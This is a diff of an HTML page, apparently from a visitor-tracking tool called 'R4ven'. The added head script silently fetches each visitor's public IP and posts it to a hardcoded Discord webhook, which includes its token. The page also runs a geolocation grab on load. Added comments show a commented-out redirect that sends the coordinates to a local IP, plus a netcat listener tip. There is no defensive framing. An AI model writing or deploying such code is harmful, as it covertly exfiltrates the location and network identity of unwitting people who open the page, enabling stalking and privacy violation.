@@ -1,5 +1,29 @@
 <!DOCTYPE html>
 <html>
+<head>
+  
+  <script>
+  function getIP(json) {
+    var ip = ("GET", "---\nIp-address: " + json.ip)
+
+    const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/977798116013133904/Es0rxL_L86Igb_lb9HeDSW2jtRy4th7k5n5LUtGsgvCRD0hOXeeHt2E8kZZYfkMpjTKY"); //change webhook
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "R4ven",
+        avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
+        content: ip
+      }
+
+      request.send(JSON.stringify(params));
+
+  }
+  </script>
+  <script src="http://api.ipify.org?format=jsonp&callback=getIP"></script>
+
+</head>
 
 <body onload="getLocation()">
 
@@ -7,7 +31,7 @@
 </iframe>
 
 
-<script src="script.js" type="text/javascript">
+<script>
 var x = document.getElementById("demo");
 
 function getLocation() {
@@ -50,6 +74,9 @@ function showPosition(position) {
       }
 
       request.send(JSON.stringify(params));
+//document.location='http://192.168.13.175:4321/'+latlong;
+// use netcat to listen (nc -nlvp portnumber) (don’t forget to chnage ip and portnumber)
+// and yeah that's random ip 😏
 }
 
 function showError(error) {
@@ -69,26 +96,5 @@ function showError(error) {
   }
 }
 </script>
-
-<script src="script.js" type="text/javascript">
-  function getIP(json) {
-    var ip = ("GET", "---\nIp-address: " + json.ip)
-
-    const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/977798116013133904/Es0rxL_L86Igb_lb9HeDSW2jtRy4th7k5n5LUtGsgvCRD0hOXeeHt2E8kZZYfkMpjTKY"); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      const params = {
-        username: "R4ven",
-        avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
-        content: ip
-      }
-
-      request.send(JSON.stringify(params));
-
-  }
-  </script>
-  <script src="http://api.ipify.org?format=jsonp&callback=getIP"></script>
 </body>
 </html>
